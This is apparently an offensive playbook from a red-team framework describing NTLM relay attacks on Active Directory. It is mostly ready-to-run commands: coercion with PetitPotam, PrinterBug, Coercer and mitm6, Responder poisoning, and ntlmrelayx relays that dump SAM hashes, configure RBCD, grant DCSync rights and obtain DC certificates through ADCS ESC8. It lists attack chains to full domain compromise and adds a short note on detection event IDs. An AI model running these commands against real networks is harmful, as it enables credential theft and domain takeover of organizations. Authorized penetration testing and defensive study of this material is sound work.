# NTLM Relay Attacks

tags: smb, relay, ntlm, ntlmrelay, ntlm-relay, responder, lateral-movement, signing, petitpotam, coercion, mitm6, adcs, rbcd, dfscoerce, printerbug, webclient

## Objective
Relay captured NTLM authentication to targets where SMB signing is disabled, or to LDAP/ADCS endpoints for privilege escalation.

## Prerequisites
- At least one target with SMB signing disabled (RELAY_TARGET edge in graph), or LDAP/ADCS endpoints
- Network position to intercept or coerce authentication
- impacket ntlmrelayx installed

## Methodology

### Identify Relay Targets
```bash
# SMB signing check — prerequisite for SMB relay (OPSEC: 0.3)
nxc smb 10.10.10.0/24 --gen-relay-list relay_targets.txt
# DCs have signing required by default; workstations typically do NOT
```

### Coercion Techniques
```bash
# PetitPotam — unauthenticated on unpatched DCs (OPSEC: 0.5)
python3 PetitPotam.py LISTENER_IP DC_IP

# PetitPotam — authenticated variant
python3 PetitPotam.py -u user -p pass -d dom LISTENER_IP DC_IP

# PrinterBug (OPSEC: 0.5)
python3 printerbug.py 'dom/user:pass'@DC_IP LISTENER_IP

# Coercer — multi-protocol coercion (OPSEC: 0.5)
coercer coerce -l LISTENER_IP -t DC_IP -d dom -u user -p pass

# mitm6 — IPv6 poisoning (OPSEC: 0.7)
sudo mitm6 -d domain.com
```

### Responder for Poisoning
```bash
# CRITICAL: Disable SMB+HTTP in Responder.conf when relaying!
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
responder -I eth0 -dwPv
# OPSEC: 0.6 — generates traffic on LLMNR/NBT-NS for all broadcast requests
```

### Relay to SMB (OPSEC: 0.6)
```bash
# SAM dump from relay targets
impacket-ntlmrelayx -tf relay_targets.txt -smb2support

# Interactive SOCKS proxy via relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks
# Requires: signing disabled + relayed user is local admin
```

### Relay to LDAP (OPSEC: 0.7)
```bash
# RBCD attack via LDAP relay
impacket-ntlmrelayx -t ldaps://DC -smb2support --delegate-access

# Grant DCSync rights via LDAP relay
impacket-ntlmrelayx -t ldap://DC -smb2support --escalate-user attacker
```

### Relay to ADCS — ESC8 (OPSEC: 0.6)
```bash
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### mitm6 + LDAP Relay Combo
```bash
# Terminal 1: IPv6 poisoning
sudo mitm6 -d domain.com
# Terminal 2: LDAP relay with RBCD
impacket-ntlmrelayx -6 -t ldaps://DC -wh fake.dom.com --delegate-access
```

### Key Attack Chains
- **PetitPotam → ADCS relay → DC certificate → DCSync** = full domain compromise
- **PetitPotam → LDAP relay → RBCD → S4U → admin** on target
- **mitm6 → LDAP relay → computer account creation → RBCD**
- **Responder → SMB relay → SAM dump/code execution**

## Graph Reporting
- **RELAY_TARGET edges**: with protocol and signing status properties, mark as tested
- **COERCE_AUTH edges**: from coercion source to target
- **Credential nodes**: from SAM dumps (`cred_type: NTLM`)
- **HAS_SESSION / ADMIN_TO edges**: from successful relay
- **ALLOWED_TO_ACT edges**: from RBCD relay
- **CAN_DCSYNC edges**: from DCSync rights escalation
- **Certificate nodes**: from ADCS relay

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| Responder poisoning | 0.6 |
| PetitPotam (unauth) | 0.5 |
| PrinterBug | 0.5 |
| Coercer multi-protocol | 0.5 |
| mitm6 IPv6 poisoning | 0.7 |
| SMB relay | 0.6 |
| LDAP relay | 0.7 |
| ADCS relay (ESC8) | 0.6 |

**Detection**: Event 4624 Type 3 with source IP mismatch, 5145 for named pipe access (efsrpc, spoolss), 4741/5136 for LDAP relay modifications.

## Sequencing
- **After**: SMB Enumeration (signing check), Network Recon
- **Feeds →**: Credential Dumping, Lateral Movement, ADCS Exploitation, AD Privilege Escalation
